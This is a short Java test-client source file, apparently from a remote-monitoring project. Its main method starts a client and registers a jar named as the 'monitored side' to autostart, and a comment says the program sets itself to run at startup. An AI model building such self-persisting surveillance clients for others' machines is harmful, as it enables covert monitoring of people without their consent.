


public class testClient {
	public static void main(String ss[]) throws Exception{
	  
	     Client.getInstance();
	     try {
				new autostart("被监视端.jar").set_it_autostart();//将自己设为自启动,,名字要固定
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}//程序名字
	}
}
